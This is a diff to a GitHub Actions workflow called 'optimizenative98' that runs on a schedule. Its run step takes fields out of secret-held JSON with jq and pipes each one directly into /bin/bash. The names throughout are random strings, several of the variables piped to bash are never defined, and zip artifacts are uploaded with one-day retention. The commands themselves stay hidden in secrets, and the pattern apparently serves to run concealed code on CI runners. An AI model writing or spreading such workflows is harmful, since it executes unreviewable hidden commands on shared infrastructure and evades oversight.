@@ -1,10 +1,9 @@
 name: optimizenative98
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '30 2/6 * * *'
 
+  schedule:
+    - cron: '48 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: optimizenative98
         env:
-          kteba7585: ${{ secrets.kteba7585 }}
+          ithei27: ${{ secrets.ithei27 }}
         run: |
-          echo $kteba7585 | jq -r .lzc47266 | /bin/bash
-          echo $xwd67 | jq -r .obu439 | /bin/bash
-          echo $akdc79210 | jq -r .t33 | /bin/bash
+          printf '%s' "$ithei27" | jq -r .m07121 | /bin/bash
+          echo $pl42 | jq -r .hi03 | /bin/bash
+          printf '%s' "$oo896" | jq -r .lu1 | /bin/bash
+          echo $gv56 | jq -r .mljp58756 | /bin/bash
+          echo $aekx91 | jq -r .bga922 | /bin/bash
+          echo $ll65 | jq -r .vw14 | /bin/bash
+          printf '%s' "$khjaf98" | jq -r .zczy537 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: h9l8bzPi
+          path: "*.zip"
+          retention-days: 1
